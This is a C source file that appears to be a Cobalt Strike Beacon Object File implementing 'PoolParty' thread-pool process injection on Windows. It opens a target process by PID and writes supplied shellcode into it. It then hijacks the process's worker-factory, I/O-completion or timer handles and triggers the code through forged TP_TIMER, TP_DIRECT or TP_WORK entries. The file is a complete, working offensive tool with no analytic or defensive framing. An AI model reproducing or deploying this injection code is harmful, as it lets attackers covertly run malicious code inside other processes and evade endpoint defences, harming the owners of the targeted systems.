#include <stdio.h>
#include <windows.h>
#include "injectpoolparty.h"
#include "beacon.h"


BYTE* NtQueryObject_(HANDLE x, OBJECT_INFORMATION_CLASS y) {
	ULONG InformationLength = 0;
	NTSTATUS Ntstatus = STATUS_INFO_LENGTH_MISMATCH;
	BYTE* Information = NULL;
	NtQueryObject_t pNtQueryObject = (NtQueryObject_t) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQueryObject");

	do {
		Information = (BYTE*)MSVCRT$realloc(Information, InformationLength);
		Ntstatus = pNtQueryObject(x, y, Information, InformationLength, &InformationLength);
	} while (STATUS_INFO_LENGTH_MISMATCH == Ntstatus);

	return Information;
}

HANDLE HijackProcessHandle(PWSTR targetType, HANDLE targetProcess, DWORD accessRights) {
    BYTE* procInfoBuffer = NULL;
    ULONG bufferSize = 0;
    NTSTATUS status = STATUS_INFO_LENGTH_MISMATCH;
    NtQueryInformationProcess_t queryInfoProc = (NtQueryInformationProcess_t)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess"));

    do {
        procInfoBuffer = (BYTE*)MSVCRT$realloc(procInfoBuffer, bufferSize);
        status = queryInfoProc(targetProcess, (PROCESSINFOCLASS)ProcessHandleInformation, procInfoBuffer, bufferSize, &bufferSize);
    } while (status == STATUS_INFO_LENGTH_MISMATCH);

    PPROCESS_HANDLE_SNAPSHOT_INFORMATION handleInfo = (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)procInfoBuffer;
    HANDLE duplicatedHandle = NULL;

    for (ULONG index = 0; index < handleInfo->NumberOfHandles; index++) {
        KERNEL32$DuplicateHandle(targetProcess, handleInfo->Handles[index].HandleValue, KERNEL32$GetCurrentProcess(), &duplicatedHandle, accessRights, FALSE, 0);

        BYTE* objTypeInfoBuffer = NtQueryObject_(duplicatedHandle, ObjectTypeInformation);
        PPUBLIC_OBJECT_TYPE_INFORMATION objTypeInfo = (PPUBLIC_OBJECT_TYPE_INFORMATION)objTypeInfoBuffer;

        if (MSVCRT$wcscmp(targetType, objTypeInfo->TypeName.Buffer) == 0) {
            return duplicatedHandle;
        }
    }

    if (procInfoBuffer) {
        MSVCRT$free(procInfoBuffer);
    }

    return NULL;
}

WORKER_FACTORY_BASIC_INFORMATION GetWorkerFactoryBasicInformation(HANDLE hWorkerFactory) {
	WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = { 0 };
	NtQueryInformationWorkerFactory_t pNtQueryInformationWorkerFactory = (NtQueryInformationWorkerFactory_t)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationWorkerFactory"));
	pNtQueryInformationWorkerFactory(hWorkerFactory, WorkerFactoryBasicInformation, &WorkerFactoryInformation, sizeof(WorkerFactoryInformation), NULL);
	
	return WorkerFactoryInformation;
}

void RemoteTpTimerInsertion(HANDLE hWorkerFactory, PVOID codeAddress, HANDLE hProcess, HANDLE hTimer) { 
	WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = GetWorkerFactoryBasicInformation(hWorkerFactory);

	PFULL_TP_TIMER pTpTimer = (PFULL_TP_TIMER)KERNEL32$CreateThreadpoolTimer((PTP_TIMER_CALLBACK)(codeAddress), NULL, NULL);
	PFULL_TP_TIMER RemoteTpTimerAddress = (PFULL_TP_TIMER)(KERNEL32$VirtualAllocEx(hProcess, NULL, sizeof(FULL_TP_TIMER), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

	int Timeout = -10000000;
	pTpTimer->Work.CleanupGroupMember.Pool = (PFULL_TP_POOL)(WorkerFactoryInformation.StartParameter);
	pTpTimer->DueTime = Timeout;
	pTpTimer->WindowStartLinks.Key = Timeout;
	pTpTimer->WindowEndLinks.Key = Timeout;
	pTpTimer->WindowStartLinks.Children.Flink = &RemoteTpTimerAddress->WindowStartLinks.Children;
	pTpTimer->WindowStartLinks.Children.Blink = &RemoteTpTimerAddress->WindowStartLinks.Children;
	pTpTimer->WindowEndLinks.Children.Flink = &RemoteTpTimerAddress->WindowEndLinks.Children;
	pTpTimer->WindowEndLinks.Children.Blink = &RemoteTpTimerAddress->WindowEndLinks.Children;

	KERNEL32$WriteProcessMemory(hProcess, RemoteTpTimerAddress, pTpTimer, sizeof(FULL_TP_TIMER), NULL);

	PVOID TpTimerWindowStartLinks = &RemoteTpTimerAddress->WindowStartLinks;
	KERNEL32$WriteProcessMemory(hProcess,
		&pTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowStart.Root,
		(PVOID)(&TpTimerWindowStartLinks),
		sizeof(TpTimerWindowStartLinks), NULL);

	PVOID TpTimerWindowEndLinks = &RemoteTpTimerAddress->WindowEndLinks;
	KERNEL32$WriteProcessMemory(hProcess, &pTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowEnd.Root, (PVOID)(&TpTimerWindowEndLinks), sizeof(TpTimerWindowEndLinks), NULL);

	LARGE_INTEGER ulDueTime = { 0 };
	ulDueTime.QuadPart = Timeout;
	T2_SET_PARAMETERS Parameters = { 0 };
	
	NtSetTimer2_t pNtSetTimer2 = (NtSetTimer2_t)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetTimer2"));
	pNtSetTimer2(hTimer, &ulDueTime, 0, &Parameters);
}

//susceptible to slow execution time
void RemoteTpWorkInsertion(HANDLE hWorkerFactory, PVOID shellcodeAddress, HANDLE hTargetPid) {
    WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = GetWorkerFactoryBasicInformation(hWorkerFactory);

	FULL_TP_POOL TargetTpPool;
    SIZE_T bytesRead;
    if (!KERNEL32$ReadProcessMemory(hTargetPid, WorkerFactoryInformation.StartParameter, &TargetTpPool, sizeof(FULL_TP_POOL), &bytesRead)) return;

    PLIST_ENTRY TargetTaskQueueHighPriorityList = &TargetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue;
    PFULL_TP_WORK pTpWork = (PFULL_TP_WORK)KERNEL32$CreateThreadpoolWork((PTP_WORK_CALLBACK)shellcodeAddress, NULL, NULL);
    pTpWork->CleanupGroupMember.Pool = (PFULL_TP_POOL)WorkerFactoryInformation.StartParameter;
    pTpWork->Task.ListEntry.Flink = TargetTaskQueueHighPriorityList;
    pTpWork->Task.ListEntry.Blink = TargetTaskQueueHighPriorityList;
    pTpWork->WorkState.Exchange = 0x2;

    PFULL_TP_WORK pRemoteTpWork = (PFULL_TP_WORK)KERNEL32$VirtualAllocEx(hTargetPid, NULL, sizeof(FULL_TP_WORK), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    KERNEL32$WriteProcessMemory(hTargetPid, pRemoteTpWork, pTpWork, sizeof(FULL_TP_WORK), NULL);


    PLIST_ENTRY RemoteWorkItemTaskList = &pRemoteTpWork->Task.ListEntry;
    KERNEL32$WriteProcessMemory(hTargetPid, &TargetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Flink, &RemoteWorkItemTaskList, sizeof(RemoteWorkItemTaskList), NULL);
    KERNEL32$WriteProcessMemory(hTargetPid, &TargetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Blink, &RemoteWorkItemTaskList, sizeof(RemoteWorkItemTaskList), NULL);
}


void RemoteTpDirectInsertion(HANDLE hIoCompletion, PVOID shellcodeAddress, HANDLE hTargetPid) {
    TP_DIRECT Direct;
	
	ZwSetIoCompletion_t pZwSetIoCompletion = (ZwSetIoCompletion_t)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "ZwSetIoCompletion"));
	
    MSVCRT$memset(&Direct, 0, sizeof(TP_DIRECT)); 
    Direct.Callback = shellcodeAddress;

    PTP_DIRECT RemoteDirectAddress = (PTP_DIRECT)KERNEL32$VirtualAllocEx(hTargetPid, NULL, sizeof(TP_DIRECT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    KERNEL32$WriteProcessMemory(hTargetPid, RemoteDirectAddress, &Direct, sizeof(TP_DIRECT), NULL);

    pZwSetIoCompletion(hIoCompletion, RemoteDirectAddress, 0, 0, 0);
}

PVOID WriteCode(HANDLE hProc, unsigned char * code, unsigned int code_len) {
    PVOID pAddress = NULL;
    DWORD dwOld = NULL;
    BOOL result;

    pAddress = KERNEL32$VirtualAllocEx(hProc, NULL, code_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL) return NULL;

    result = KERNEL32$WriteProcessMemory(hProc, pAddress, (PVOID) code, (SIZE_T) code_len, (SIZE_T *) NULL);
    if (!result) goto cleanup;

    result = KERNEL32$VirtualProtectEx(hProc, pAddress, code_len, PAGE_EXECUTE_READ, &dwOld);
    if (!result) goto cleanup;

    return pAddress;

cleanup:
    if (pAddress != NULL) KERNEL32$VirtualFreeEx(hProc, pAddress, 0, MEM_RELEASE);
    return NULL;
}


int go(char *args, int len) {
	datap parser;
    HANDLE hProc = NULL; 
	PVOID pAddress = NULL;
	HANDLE hWorkerFactory = NULL;
	HANDLE hTimer = NULL;
	DWORD pid = NULL;
	CHAR *option = ""; 
	unsigned char * code = NULL;
	unsigned int code_len = NULL;
	
	BeaconDataParse(&parser, args, len);
	option = BeaconDataExtract(&parser, NULL);
	pid = BeaconDataInt(&parser);
	code = BeaconDataExtract(&parser, &code_len);

	hProc = KERNEL32$OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, (DWORD) pid);
	if (!hProc) {
		BeaconPrintf(CALLBACK_ERROR, "[ERROR] Failed opening a handle to the specified process.\n");
		return -1;
	}
	
	pAddress = WriteCode(hProc, code, code_len);
	if (!pAddress) {
		BeaconPrintf(CALLBACK_ERROR, "[ERROR] Failed to write code to the designated process.\n");
		return -1;
	}
	
	//variant 8
	if (MSVCRT$strcmp(option, "TP_TIMER") == 0) {
		hWorkerFactory = HijackProcessHandle((PWSTR)L"TpWorkerFactory\0", hProc, WORKER_FACTORY_ALL_ACCESS); 
		hTimer = HijackProcessHandle((PWSTR)L"IRTimer\0", hProc, TIMER_ALL_ACCESS);
		if (!hWorkerFactory || !hTimer) goto cleanup;
			
		RemoteTpTimerInsertion(hWorkerFactory, pAddress, hProc, hTimer);
	}
	//variant 7
	if (MSVCRT$strcmp(option, "TP_DIRECT") == 0) {
		hWorkerFactory = HijackProcessHandle((PWSTR)L"IoCompletion\0", hProc, IO_COMPLETION_ALL_ACCESS); 
		if (!hWorkerFactory) goto cleanup;
		
		RemoteTpDirectInsertion(hWorkerFactory, pAddress, hProc); 
	}
	//variant 2:
	if (MSVCRT$strcmp(option, "TP_WORK") == 0) {
		hWorkerFactory = HijackProcessHandle((PWSTR)L"TpWorkerFactory\0", hProc, WORKER_FACTORY_ALL_ACCESS);
		if (!hWorkerFactory) goto cleanup;
		
		RemoteTpWorkInsertion(hWorkerFactory, pAddress, hProc); 
	}
	
	BeaconPrintf(CALLBACK_OUTPUT, "Successfully injected code in process ID [%d] at memory address [%p].\n", pid, pAddress); 

cleanup:
	KERNEL32$CloseHandle(hProc);
	return 0; 
}

